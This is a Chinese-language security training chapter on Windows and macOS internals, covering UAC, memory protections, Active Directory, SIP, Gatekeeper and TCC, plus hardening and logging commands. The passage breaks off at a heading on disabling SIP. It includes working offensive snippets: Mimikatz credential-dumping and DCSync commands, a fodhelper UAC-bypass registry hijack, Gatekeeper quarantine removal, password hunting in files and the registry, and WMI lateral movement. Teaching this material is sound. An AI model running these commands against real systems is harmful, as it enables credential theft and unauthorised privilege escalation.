---
title: "第07章-操作系统基础-Windows-macOS"
type: docs
weight: 7
---

# 第07章 操作系统基础——Windows与macOS

## 章节概述

在网络安全领域，操作系统是攻击与防御的核心战场。本章将深入探讨Windows和macOS两大操作系统的架构、安全机制及攻防技术，为安全从业者提供全面的底层知识体系。

## 学习目标

通过本章学习，读者将能够：

1. **理解Windows系统架构**：掌握Windows内核模式与用户模式的分离机制，理解NT架构的核心组件及其安全边界
2. **掌握Windows安全机制**：深入理解UAC、ASLR、DEP、CFG等安全防护技术的原理与实现
3. **熟悉Active Directory安全**：掌握企业级目录服务的安全配置与常见攻击手法
4. **了解macOS安全体系**：理解XNU内核架构、SIP保护机制、Gatekeeper应用验证等安全特性
5. **掌握跨平台安全思维**：能够针对不同操作系统制定相应的安全测试策略

## 内容结构

本章分为六个核心模块：

### 第一部分：理论基础（01-理论基础.md）
深入讲解Windows和macOS的系统架构、安全模型、权限管理机制等底层原理，建立扎实的理论知识体系。涵盖Windows NT架构、注册表安全、Active Directory设计原理，以及macOS的XNU内核架构、沙盒机制、代码签名等核心概念。

### 第二部分：核心技巧（02-核心技巧.md）
介绍两大操作系统的关键安全技术和实用技巧。包括Windows的PowerShell安全、组策略配置、日志分析，以及macOS的安全策略管理、终端命令、权限提升技术等。

### 第三部分：实战案例（03-实战案例.md）
通过真实场景演示操作系统安全攻防。包括Windows域环境渗透、UAC绕过技术、凭证提取，以及macOS的权限提升、持久化后门、安全机制绕过等实战案例。

### 第四部分：常见误区（04-常见误区.md）
分析安全从业者在学习操作系统安全时的常见错误认知和实践误区，帮助读者建立正确的安全观念。

### 第五部分：练习方法（05-练习方法.md）
提供系统化的学习路径和实践建议，包括靶场环境搭建、工具使用、技能训练等。

### 第六部分：本章小结（06-本章小结.md）
总结本章核心知识点，回顾关键概念和技术要点。

## 前置知识

学习本章前，建议读者具备以下基础知识：

- 计算机基础操作能力
- 对操作系统基本概念有初步了解
- 建议先学习第06章《操作系统基础——Linux》
- 基本的命令行操作经验

## 学习时间建议

- 理论学习：15-20小时
- 实践练习：20-30小时
- 综合项目：10-15小时
- 总计建议：45-65小时（约2-3周全日制学习）

## 核心重点

1. **Windows安全架构**是企业安全的核心，必须深入理解
2. **Active Directory**是现代企业网络的基石，其安全至关重要
3. **macOS安全机制**在Apple生态系统中日益重要，特别是在移动办公场景
4. **跨平台思维**能够帮助安全从业者应对多样化的IT环境

## 章节价值

本章内容直接关联以下安全领域：

- **渗透测试**：Windows/macOS系统的漏洞利用与权限提升
- **红队攻防**：企业环境中的横向移动与持久化
- **蓝队防御**：终端安全监控与事件响应
- **安全运营**：系统安全基线配置与合规检查
- **漏洞研究**：操作系统内核与应用层漏洞挖掘

通过本章学习，读者将建立起完整的操作系统安全知识框架，为后续的渗透测试、漏洞研究等高级技术打下坚实基础。

***
# 第07章 操作系统基础——Windows与macOS

# 01 理论基础

## 一、Windows系统架构

### 1.1 Windows NT架构概述

Windows NT是现代Windows操作系统的基础架构，从Windows NT 3.1开始，经过数十年的演进，形成了当前复杂的系统体系。理解NT架构是掌握Windows安全的核心。

#### 1.1.1 双模式架构

Windows采用经典的双模式架构设计：

**用户模式（User Mode）**：
- 应用程序运行的环境
- 受限的内存访问权限
- 通过系统调用接口（System Call）与内核交互
- 进程间相互隔离
- 崩溃不会影响系统稳定性

**内核模式（Kernel Mode）**：
- 操作系统核心运行环境
- 完全的内存访问权限
- 直接访问硬件资源
- 驱动程序运行于此
- 崩溃会导致系统蓝屏（BSOD）

这种分离设计是Windows安全的基础，任何试图从用户模式突破到内核模式的行为都是高价值攻击目标。

#### 1.1.2 核心组件架构

Windows NT架构由以下核心组件构成：

**硬件抽象层（HAL）**：
- 位于最底层，隔离硬件差异
- 为上层提供统一的硬件接口
- 实现平台无关性
- 文件：hal.dll

**内核（Kernel）**：
- 管理线程调度、中断处理、多处理器同步
- 提供核心对象管理
- 实现低级内存管理
- 文件：ntoskrnl.exe

**执行体（Executive）**：
- 提供高级系统服务
- 包含多个管理器：
  - 对象管理器（Object Manager）
  - 进程管理器（Process Manager）
  - 内存管理器（Memory Manager）
  - 安全引用监视器（Security Reference Monitor）
  - I/O管理器（I/O Manager）
  - 配置管理器（Configuration Manager）

**系统服务**：
- Win32子系统（csrss.exe）
- 安全子系统（lsass.exe）
- 会话管理器（smss.exe）

### 1.2 Windows安全模型

#### 1.2.1 访问控制模型

Windows采用基于对象的访问控制模型：

**安全描述符（Security Descriptor）**：
- 每个安全对象都关联一个安全描述符
- 包含以下组件：
  - 所有者SID（Owner SID）
  - 组SID（Group SID）
  - 自主访问控制列表（DACL）
  - 系统访问控制列表（SACL）

**访问令牌（Access Token）**：
- 进程的安全身份标识
- 包含用户SID、组SID、权限列表
- 登录时由LSASS创建
- 每个进程都关联一个访问令牌

**访问检查过程**：
1. 线程尝试访问对象
2. 安全引用监视器介入
3. 比较线程令牌与对象DACL
4. 决定是否授予访问权限
5. 记录到SACL（如果配置了审计）

#### 1.2.2 安全标识符（SID）

SID是Windows安全模型的基础：

```text
S-1-5-21-3623811015-3361044348-30300820-1013
S：SID版本号
1：修订级别
5：标识符颁发机构
21-3623811015-3361044348-30300820：域标识符
1013：相对标识符（RID）
```

常见内置SID：
- S-1-5-18：SYSTEM账户
- S-1-5-19：LOCAL SERVICE
- S-1-5-20：NETWORK SERVICE
- S-1-5-32-544：Administrators组

### 1.3 Windows安全子系统

#### 1.3.1 安全子系统组件

**本地安全认证服务器（LSASS）**：
- 核心安全进程
- 处理用户认证
- 管理安全策略
- 存储凭据信息
- 实施访问控制

**安全账户管理器（SAM）**：
- 本地用户数据库
- 存储密码哈希
- 位置：%SystemRoot%\System32\config\SAM

**Active Directory**：
- 域环境用户数据库
- 基于LDAP协议
- 分布式架构
- 支持组策略

#### 1.3.2 认证机制

**NTLM认证**：
- 质询-响应协议
- 三种类型：LM、NTLMv1、NTLMv2
- 密码哈希存储在SAM或NTDS.dit
- 易受Pass-the-Hash攻击

**Kerberos认证**：
- 域环境默认认证协议
- 基于票据（Ticket）机制
- 核心组件：
  - KDC（密钥分发中心）
  - TGT（票据授予票据）
  - TGS（票据授予服务）
- 支持委派（Delegation）

**认证流程**：
1. 用户输入凭据
2. LSASS处理认证请求
3. 对于域认证：向KDC请求TGT
4. 使用TGT请求服务票据
5. 访问目标服务

### 1.4 Windows内存管理

#### 1.4.1 虚拟内存系统

Windows采用页式虚拟内存管理：

**地址空间布局**：
- 用户空间：0x00000000 - 0x7FFFFFFF（32位）
- 内核空间：0x80000000 - 0xFFFFFFFF（32位）
- 64位系统有更大的地址空间

**内存保护机制**：
- DEP（数据执行保护）
- ASLR（地址空间布局随机化）
- CFG（控制流保护）
- SEHOP（结构化异常处理覆盖保护）

#### 1.4.2 堆管理

**进程堆**：
- 默认堆：进程创建时自动分配
- 私有堆：通过HeapCreate创建
- 低碎片堆（LFH）：Windows Vista+默认启用

**堆安全特性**：
- 堆头校验
- 堆段随机化
- 安全unlinking

### 1.5 Windows注册表

#### 1.5.1 注册表结构

注册表是Windows的核心配置数据库：

**根键（Root Keys）**：
- HKEY_LOCAL_MACHINE (HKLM)：系统配置
- HKEY_CURRENT_USER (HKCU)：当前用户配置
- HKEY_CLASSES_ROOT (HKCR)：文件关联
- HKEY_USERS (HKU)：所有用户配置
- HKEY_CURRENT_CONFIG (HKCC)：当前硬件配置

**安全相关注册表路径**：
```text
HKLM\SAM：用户账户信息
HKLM\SECURITY：安全策略
HKLM\SYSTEM：系统配置
HKLM\SOFTWARE：软件配置
```

#### 1.5.2 注册表安全

**访问控制**：
- 注册表项有独立的安全描述符
- 支持ACL权限设置
- 可配置审计策略

**常见攻击面**：
- 自启动项（Run/RunOnce）
- 服务配置
- COM对象劫持
- 影子副本访问

***
## 二、macOS系统架构

### 2.1 XNU内核架构

macOS基于XNU（X is Not Unix）内核，这是一个混合内核，结合了Mach微内核和BSD（Berkeley Software Distribution）层。

#### 2.1.1 Mach微内核

Mach是XNU的核心组件：

**核心概念**：
- 任务（Task）：资源容器
- 线程（Thread）：执行单元
- 端口（Port）：通信通道
- 消息（Message）：通信数据

**Mach安全特性**：
- 基于端口的访问控制
- 任务间通信隔离
- 主机端口权限管理

#### 2.1.2 BSD层

BSD层提供Unix兼容接口：

**核心功能**：
- 进程管理
- 文件系统
- 网络协议栈
- POSIX兼容接口

**安全特性**：
- Unix权限模型
- 进程凭证（Process Credentials）
- 强制访问控制框架（MAC Framework）

#### 2.1.3 I/O Kit

I/O Kit是macOS的驱动框架：

**特点**：
- 面向对象设计（C++）
- 分层驱动模型
- 动态加载能力
- 电源管理集成

### 2.2 macOS安全架构

#### 2.2.1 系统完整性保护（SIP）

SIP（System Integrity Protection）是macOS的核心安全机制：

**保护范围**：
- /System目录
- /usr目录（除了/usr/local）
- /sbin目录
- 预装内核扩展

**保护机制**：
- 即使root也无法修改受保护文件
- 限制动态库注入
- 禁止未签名内核扩展加载
- 保护进程内存

**绕过方法**：
- 物理访问：恢复模式禁用SIP
- 内核漏洞：提权后修改
- 配置错误：管理员误操作

#### 2.2.2 Gatekeeper应用验证

Gatekeeper控制应用程序的执行权限：

**验证流程**：
1. 应用程序下载时添加隔离属性（com.apple.quarantine）
2. 首次运行时检查签名状态
3. 验证开发者ID签名
4. 检查公证状态（Notarization）
5. 用户确认后允许运行

**安全级别**：
- Mac App Store：仅允许App Store应用
- Mac App Store和已认证开发者：默认设置
- 任何来源：需要手动启用

**绕过技术**：
- 移除隔离属性：`xattr -d com.apple.quarantine app.app`
- 利用合法开发者证书
- 利用已签名的脚本加载器

#### 2.2.3 代码签名

macOS强制要求代码签名：

**签名类型**：
- 开发者ID签名：用于分发
- 临时签名：用于开发
- Mac App Store签名：用于商店分发

**验证机制**：
- 代码目录哈希验证
- 签名证书链验证
- 撤销列表检查
- 公证状态验证

### 2.3 macOS沙盒机制

#### 2.3.1 App Sandbox

App Sandbox是macOS应用的强制隔离机制：

**核心组件**：
- 容器目录：应用专属数据存储
- 权限声明：在Entitlements中配置
- 沙盒配置文件：定义访问规则

**限制能力**：
- 文件系统访问受限
- 网络访问需要权限
- 硬件访问受控
- 进程间通信受限

#### 2.3.2 沙盒配置文件

沙盒配置使用Scheme语言定义：

```scheme
(version 1)
(deny default)
(allow file-read* (subpath "/Users/username/Documents"))
(allow network*)
(allow process-exec*)
```

**配置能力**：
- 精细的文件访问控制
- 网络访问策略
- 进程执行限制
- Mach服务访问控制

### 2.4 macOS权限模型

#### 2.4.1 Unix权限

macOS继承了BSD的权限模型：

**基本权限**：
- 所有者（Owner）
- 组（Group）
- 其他（Others）

**特殊权限**：
- SUID：以文件所有者身份运行
- SGID：以文件所属组身份运行
- Sticky Bit：限制目录删除权限

#### 2.4.2 访问控制列表（ACL）

macOS支持POSIX ACL：

**ACL条目类型**：
- 用户（user）
- 组（group）
- 掩码（mask）
- 其他（other）

**权限类型**：
- read
- write
- execute
- delete
- append
- readdirectory
- addfile
- addsubdirectory
- readattributes
- writeattributes
- readextattributes
- writeextattributes
- readsecurity
- writesecurity
- chown

#### 2.4.3 TCC（透明、同意和控制）

TCC管理应用对隐私数据的访问：

**保护的资源**：
- 摄像头和麦克风
- 位置服务
- 联系人、日历、提醒事项
- 照片库
- 辅助功能
- 自动化（Apple Events）
- 磁盘访问
- 文件和文件夹

**TCC数据库位置**：
```text
~/Library/Application Support/com.apple.TCC/TCC.db
```

**绕过技术**：
- 利用已授权应用
- 目录服务攻击
- 符号链接攻击

### 2.5 macOS网络安全

#### 2.5.1 应用防火墙

macOS内置应用防火墙：

**功能**：
- 基于应用的过滤
- 阻止传入连接
- 自动允许签名应用
- 隐蔽模式

**配置**：
```bash
# 查看防火墙状态
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# 启用防火墙
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on

# 启用隐蔽模式
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
```

#### 2.5.2 pf防火墙

macOS继承了BSD的pf（Packet Filter）防火墙：

**配置文件**：/etc/pf.conf

**基本规则**：
```text
# 阻止所有入站
block in all

# 允许SSH
pass in proto tcp to port 22

# 允许已建立连接
pass out all keep state
```

***
## 三、Windows安全机制深度解析

### 3.1 用户账户控制（UAC）

#### 3.1.1 UAC设计原理

UAC是Windows Vista引入的安全机制：

**设计目标**：
- 限制管理员权限的默认使用
- 减少恶意软件的权限提升机会
- 提供标准用户友好的体验

**工作机制**：
1. 管理员用户默认获得标准用户令牌
2. 需要管理员权限时触发UAC提示
3. 用户确认后提升权限
4. 使用提升的令牌执行操作

#### 3.1.2 UAC安全级别

**UAC滑块设置**：
- 始终通知：最高安全级别
- 默认设置：应用程序尝试更改时通知
- 仅应用程序尝试更改时通知（不调暗桌面）
- 从不通知：最低安全级别

**注册表控制**：
```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA：启用/禁用UAC
ConsentPromptBehaviorAdmin：管理员提示行为
ConsentPromptBehaviorUser：标准用户提示行为
PromptOnSecureDesktop：安全桌面提示
```

#### 3.1.3 UAC绕过技术

**常见绕过方法**：

1. **自动提升白名单**：
   - Windows自带的管理工具
   - 合法的系统二进制文件
   - 如：eventvwr.exe、sdclt.exe

2. **DLL劫持**：
   - 利用自动提升程序加载的DLL
   - 搜索顺序劫持
   - 侧加载（Side-loading）

3. **COM对象劫持**：
   - 利用COM对象的自动提升特性
   - 注册表键值劫持
   - 进程注入

4. **Token模拟**：
   - 利用特权进程的令牌
   - 进程间通信
   - 父进程PID欺骗

### 3.2 地址空间布局随机化（ASLR）

#### 3.2.1 ASLR原理

ASLR随机化内存布局：

**随机化范围**：
- 可执行文件基址
- 堆地址
- 栈地址
- PEB/TEB地址
- 系统DLL地址

**实现机制**：
- 系统级ASLR：Windows Vista+
- 强制ASLR：/DYNAMICBASE链接选项
- High Entropy ASLR：Windows 8+，64位

#### 3.2.2 ASLR绕过技术

**常见绕过方法**：

1. **信息泄露**：
   - 利用格式化字符串漏洞
   - 堆溢出泄露指针
   - JavaScript堆喷射

2. **部分覆盖**：
   - 仅覆盖地址的低16位
   - 利用地址空间的规律性

3. **非ASLR模块**：
   - 寻找未启用ASLR的模块
   - 第三方DLL

4. **Brute Force**：
   - 32位系统熵较低
   - 利用fork服务

### 3.3 数据执行保护（DEP）

#### 3.3.1 DEP原理

DEP防止代码在非执行内存区域运行：

**实现方式**：
- 硬件DEP（NX bit）：CPU支持
- 软件DEP：Windows实现

**DEP策略**：
- OptIn：默认启用系统组件
- OptOut：默认启用所有程序
- AlwaysOn：强制启用
- AlwaysOff：强制禁用

#### 3.3.2 DEP绕过技术

**常见绕过方法**：

1. **Return-Oriented Programming（ROP）**：
   - 利用已有代码片段
   - 构造ROP链
   - 执行任意操作

2. **跳转到已分配的可执行内存**：
   - VirtualAlloc分配内存
   - 复制shellcode
   - 跳转执行

3. **利用.NET/Java JIT**：
   - JIT编译器分配可执行内存
   - 修改JIT代码

### 3.4 控制流保护（CFG）

#### 3.4.1 CFG原理

CFG保护间接调用目标：

**实现机制**：
- 编译时：在间接调用前插入检查代码
- 运行时：维护合法目标位图
- 检查：验证目标地址是否合法

**保护范围**：
- 间接函数调用
- 虚函数调用
- 函数指针调用

#### 3.4.2 CFG绕过技术

**常见绕过方法**：

1. **利用合法目标**：
   - 寻找有用的合法调用目标
   - 函数指针重用

2. **CFG位图攻击**：
   - 修改位图数据
   - 利用位图验证缺陷

3. **非CFG模块**：
   - 加载未启用CFG的DLL
   - 利用兼容性问题

***
## 四、Active Directory安全

### 4.1 Active Directory架构

#### 4.1.1 核心组件

**域控制器（Domain Controller）**：
- 存储AD数据库（NTDS.dit）
- 处理认证请求
- 复制目录数据

**组织单位（OU）**：
- 逻辑容器
- 应用组策略
- 委派管理权限

**组策略对象（GPO）**：
- 集中配置管理
- 安全策略分发
- 软件部署

#### 4.1.2 AD数据库

**NTDS.dit文件**：
- 位置：%SystemRoot%\NTDS\ntds.dit
- 包含所有域对象
- 存储密码哈希

**数据库结构**：
- 数据表：存储对象属性
- 链接表：存储组成员关系
- 索引表：加速查询

### 4.2 AD认证机制

#### 4.2.1 Kerberos协议详解

**认证流程**：
1. 用户登录，输入凭据
2. 客户端向KDC的AS服务请求TGT
3. AS验证凭据，返回TGT（加密）
4. 客户端向KDC的TGS请求服务票据
5. TGS验证TGT，返回服务票据
6. 客户端使用服务票据访问服务

**关键票据**：
- TGT：票据授予票据，用于获取服务票据
- TGS：票据授予服务票据，用于访问服务
- 服务票据：直接用于服务认证

#### 4.2.2 NTLM在域环境中的应用

**NTLM中继攻击**：
1. 攻击者诱骗目标访问恶意服务器
2. 目标向攻击者发送NTLM响应
3. 攻击者将响应转发给目标服务
4. 获得对目标服务的访问权限

**防护措施**：
- SMB签名
- EPA（Extended Protection for Authentication）
- LDAP签名

### 4.3 AD攻击技术

#### 4.3.1 凭据提取

**Mimikatz攻击**：
```text
# 提取内存中的凭据
privilege::debug
sekurlsa::logonpasswords

# 提取SAM数据库
token::elevate
lsadump::sam

# 提取NTDS.dit
lsadump::dcsync /domain:target.local /user:Administrator
```

**DCSync攻击**：
- 模拟域控制器复制
- 无需访问DC文件系统
- 通过DRS协议获取凭据

#### 4.3.2 权限提升

**Kerberoasting**：
1. 枚举服务账户（SPN）
2. 请求服务票据
3. 离线破解票据哈希
4. 获取服务账户密码

**AS-REP Roasting**：
1. 枚举禁用预认证的账户
2. 请求AS-REP
3. 离线破解响应哈希

#### 4.3.3 横向移动

**Pass-the-Hash**：
- 使用密码哈希直接认证
- 无需破解密码
- 适用于NTLM认证

**Pass-the-Ticket**：
- 使用窃取的Kerberos票据
- 注入到当前会话
- 访问授权资源

***
## 五、macOS安全机制深度解析

### 5.1 内核安全

#### 5.1.1 内核完整性保护

**KTRR（Kernel Text Readonly Region）**：
- Apple Silicon设备
- 硬件级别内核代码保护
- 防止内核代码修改

**AMCC（Apple Memory Controller Configuration）**：
- 控制内存访问权限
- 硬件级别隔离

#### 5.1.2 系统管理防护（SMC）

**SMC功能**：
- 电源管理
- 温度控制
- 灯光控制
- 安全功能

**安全相关**：
- 固件密码保护
- 启动安全性策略
- 安全启动链

### 5.2 启动安全

#### 5.2.1 安全启动链

**启动流程**：
1. Boot ROM：硬件信任根
2. iBoot：第二阶段引导加载程序
3. Kernel：内核加载
4. kext：内核扩展加载

**安全验证**：
- 每个阶段验证下一阶段的签名
- 苹果根证书信任链
- 撤销列表检查

#### 5.2.2 启动安全性策略

**Full Security**：
- 只允许最新签名的macOS
- 防止降级攻击

**Reduced Security**：
- 允许旧版本macOS
- 仍然要求签名

**No Security**：
- 允许任意操作系统
- 主要用于开发

### 5.3 数据保护

#### 5.3.1 FileVault全盘加密

**加密机制**：
- XTS-AES-128加密
- 基于用户密码派生密钥
- 支持恢复密钥

**安全特性**：
- 实时加密/解密
- 安全擦除
- 多用户支持

#### 5.3.2 数据保护类

**保护级别**：
- Complete Protection：锁屏后密钥丢弃
- Protected Unless Open：文件打开时保持
- Protected Until First User Auth：首次认证前保护
- No Protection：无保护

**实现机制**：
- 每个文件独立密钥
- 类密钥（Class Key）保护
- 硬件密钥（Hardware Key）绑定

### 5.4 网络安全

#### 5.4.1 证书信任模型

**系统钥匙串**：
- 位置：/Library/Keychains/System.keychain
- 存储系统证书
- 需要管理员权限修改

**用户钥匙串**：
- 位置：~/Library/Keychains/login.keychain-db
- 存储用户证书
- 自动解锁

#### 5.4.2 网络安全策略

**ATS（App Transport Security）**：
- 强制HTTPS连接
- 禁用不安全的加密算法
- 证书透明度要求

**配置选项**：
```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
    <key>NSExceptionDomains</key>
    <dict>
        <key>example.com</key>
        <dict>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <false/>
        </dict>
    </dict>
</dict>
```

***
## 六、操作系统安全对比

### 6.1 Windows vs macOS安全模型对比

| 特性 | Windows | macOS |
|------|---------|-------|
| 内核架构 | NT内核 | XNU混合内核 |
| 权限模型 | ACL + UAC | Unix权限 + ACL + SIP |
| 应用沙盒 | AppContainer | App Sandbox |
| 代码签名 | 可选（强制用于商店） | 强制要求 |
| 系统保护 | 无类似SIP | SIP + KTRR |
| 认证协议 | NTLM + Kerberos | Kerberos + Open Directory |

### 6.2 攻击面差异

**Windows攻击面**：
- Active Directory
- Windows服务
- 注册表
- COM对象
- PowerShell

**macOS攻击面**：
- Mach消息
- XPC服务
- 权限提升
- TCC绕过
- 内核扩展

### 6.3 防御机制差异

**Windows防御**：
- Windows Defender
- AMSI（反恶意软件扫描接口）
- Credential Guard
- Device Guard

**macOS防御**：
- XProtect
- MRT（恶意软件删除工具）
- Gatekeeper
- SIP

***
## 七、学习资源

### 7.1 推荐书籍

- 《Windows Internals》（第7版）：Windows系统架构权威指南
- 《macOS Internal》：macOS内部机制详解
- 《Windows Security Internals》：Windows安全机制深入分析
- 《The Art of Mac Malware Analysis》：macOS恶意软件分析

### 7.2 在线资源

- Microsoft Documentation：官方技术文档
- Apple Developer Documentation：Apple官方文档
- Project Zero Blog：Google零日漏洞研究
- HackTricks：渗透测试技巧百科

### 7.3 实践环境

- Windows评估和部署工具包（ADK）
- Windows调试工具（WinDbg）
- macOS虚拟机（VMware/VirtualBox）
- 域环境搭建（Windows Server）

通过深入理解Windows和macOS的系统架构和安全机制，安全从业者能够更好地识别攻击面、评估安全风险、制定防御策略。这些底层知识是高级安全技术的基础，需要持续学习和实践。

***
# 第07章 操作系统基础——Windows与macOS

# 02 核心技巧

## 一、Windows安全核心技巧

### 1.1 PowerShell安全技术

#### 1.1.1 PowerShell执行策略

PowerShell执行策略是控制脚本执行的第一道防线：

**策略类型**：
- Restricted：默认策略，禁止执行脚本
- AllSigned：只允许签名脚本
- RemoteSigned：本地脚本无限制，远程脚本需要签名
- Unrestricted：无限制执行
- Bypass：绕过所有策略

**查看和设置策略**：
```powershell
# 查看当前策略
Get-ExecutionPolicy

# 查看所有范围的策略
Get-ExecutionPolicy -List

# 设置策略
Set-ExecutionPolicy RemoteSigned

# 临时绕过策略
powershell -ExecutionPolicy Bypass -File script.ps1
```

#### 1.1.2 PowerShell安全特性

**AMSI集成**：
- 反恶意软件扫描接口
- 扫描PowerShell命令和脚本
- 集成Windows Defender

**脚本块日志**：
```powershell
# 启用脚本块日志
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

**模块日志**：
```powershell
# 启用模块日志
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
```

#### 1.1.3 PowerShell渗透技术

**信息收集**：
```powershell
# 系统信息
Get-WmiObject Win32_OperatingSystem
Get-ComputerInfo

# 网络信息
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection

# 用户和组
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"

# 进程信息
Get-Process
Get-Service

# 已安装软件
Get-WmiObject Win32_Product
```

**远程执行**：
```powershell
# 使用WinRM远程执行
Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }

# 使用PsExec风格执行
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami" -Credential $cred

# 建立持久会话
$session = New-PSSession -ComputerName DC01
Enter-PSSession -Session $session
```

**权限提升**：
```powershell
# 检查当前权限
whoami /priv
whoami /groups

# UAC绕过示例（使用自动提升程序）
$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item -Path $regPath -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
New-ItemProperty -Path $regPath -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "fodhelper.exe"
```

**横向移动**：
```powershell
# WMI横向移动
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName DC01

# PSRemoting横向移动
$cred = Get-Credential
Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { whoami }

# 计划任务
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\temp\output.txt"
Register-ScheduledTask -TaskName "TestTask" -Action $Action -User "SYSTEM"
```

### 1.2 Windows命令行技巧

#### 1.2.1 系统信息收集

**CMD命令**：
```cmd
:: 系统信息
systeminfo
hostname
wmic os get caption,version,buildnumber

:: 网络信息
ipconfig /all
netstat -ano
arp -a
route print

:: 用户和组
net user
net user /domain
net localgroup administrators
net group "Domain Admins" /domain

:: 服务和进程
tasklist /v
net start
sc query type= service state= all
```

#### 1.2.2 文件系统操作

**文件搜索**：
```cmd
:: 搜索文件
dir /s /b C:\*.txt
where /r C:\ *.config
forfiles /p C:\ /s /m *.log /c "cmd /c echo @path"

:: 文件内容搜索
findstr /si "password" *.txt *.config
findstr /spin "password" *.*
```

**文件权限**：
```cmd
:: 查看权限
icacls "C:\sensitive"
cacls "C:\sensitive"

:: 修改权限
icacls "C:\sensitive" /grant Everyone:F
icacls "C:\sensitive" /inheritance:r
```

#### 1.2.3 注册表操作

**注册表查询**：
```cmd
:: 查询注册表
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

:: 搜索注册表
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s

:: 导出注册表
reg export "HKLM\SOFTWARE" C:\backup.reg
```

### 1.3 Windows安全配置

#### 1.3.1 组策略配置

**重要安全策略**：

**账户策略**：
- 密码复杂性要求
- 密码最长使用期限
- 账户锁定阈值
- 重置账户锁定计数器

**本地策略**：
- 审核策略配置
- 用户权限分配
- 安全选项

**高级安全策略**：
- Windows防火墙配置
- IPsec策略
- 软件限制策略

#### 1.3.2 服务安全

**服务配置检查**：
```powershell
# 检查服务启动类型
Get-WmiObject Win32_Service | Select-Object Name, StartMode, State, StartName

# 检查服务权限
Get-ServiceAcl -Name "ServiceName"

# 检查未引用的服务路径
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"'} | Select-Object Name, PathName
```

**服务加固**：
- 最小权限原则配置服务账户
- 限制服务文件权限
- 禁用不必要的服务
- 定期审核服务配置

#### 1.3.3 防火墙配置

**Windows防火墙命令**：
```cmd
:: 查看防火墙状态
netsh advfirewall show allprofiles

:: 启用防火墙
netsh advfirewall set allprofiles state on

:: 添加规则
netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=tcp localport=22

:: 删除规则
netsh advfirewall firewall delete rule name="Allow SSH"

:: 导出配置
netsh advfirewall export "C:\firewall.wfw"
```

### 1.4 Windows日志分析

#### 1.4.1 事件日志类型

**核心日志**：
- System：系统事件
- Application：应用程序事件
- Security：安全事件

**扩展日志**：
- Microsoft-Windows-Sysmon/Operational
- Microsoft-Windows-PowerShell/Operational
- Microsoft-Windows-WMI-Activity/Operational

#### 1.4.2 关键安全事件

**登录事件**：
- 4624：登录成功
- 4625：登录失败
- 4634：注销
- 4648：显式凭据登录
- 4672：特殊权限分配

**进程创建**：
- 4688：新进程创建（需要启用进程跟踪）
- Sysmon Event 1：进程创建（详细信息）

**账户管理**：
- 4720：用户账户创建
- 4722：用户账户启用
- 4724：密码重置
- 4728：组成员添加

#### 1.4.3 日志分析工具

**PowerShell日志分析**：
```powershell
# 查询登录事件
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 10

# 查询失败登录
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 10

# 查询进程创建
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} -MaxEvents 10

# 导出日志
Get-WinEvent -FilterHashtable @{LogName='Security'} | Export-Csv -Path "C:\security_events.csv"
```

**第三方工具**：
- Event Log Explorer
- Splunk
- ELK Stack
- Graylog

***
## 二、macOS安全核心技巧

### 2.1 终端安全命令

#### 2.1.1 系统信息收集

**基本信息**：
```bash
# 系统版本
sw_vers
system_profiler SPSoftwareDataType

# 硬件信息
system_profiler SPHardwareDataType

# 网络信息
ifconfig
netstat -an
networksetup -listallhardwareports

# 用户信息
dscl . list /Users
id
whoami
```

**安全信息**：
```bash
# SIP状态
csrutil status

# Gatekeeper状态
spctl --status

# FileVault状态
fdesetup status

# 防火墙状态
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
```

#### 2.1.2 进程和服务管理

**进程管理**：
```bash
# 查看进程
ps aux
ps -ef
top -l 1

# 查找特定进程
pgrep -f "process_name"
ps aux | grep "process_name"

# 终止进程
kill -9 PID
killall "process_name"
```

**服务管理（launchd）**：
```bash
# 查看系统服务
sudo launchctl list
launchctl list

# 查看特定服务
sudo launchctl list | grep "service_name"

# 加载服务
sudo launchctl load /Library/LaunchDaemons/com.example.service.plist

# 卸载服务
sudo launchctl unload /Library/LaunchDaemons/com.example.service.plist
```

#### 2.1.3 文件系统操作

**文件搜索**：
```bash
# 使用find
find / -name "*.txt" -type f 2>/dev/null
find /Users -name "*.plist" -mtime -7

# 使用mdfind（Spotlight命令行）
mdfind "kMDItemTextContent == 'password'"
mdfind -name "*.keychain"

# 使用locate
sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.locate.plist
locate "*.conf"
```

**文件权限**：
```bash
# 查看权限
ls -la
ls -le  # 显示ACL

# 修改权限
chmod 755 file
chmod +x script.sh

# 修改ACL
chmod +a "user:username allow read,write" file
chmod -a "user:username allow read,write" file
```

### 2.2 macOS安全配置

#### 2.2.1 SIP管理

**查看SIP状态**：
```bash
csrutil status
```

**禁用SIP（需要恢复模式）**：
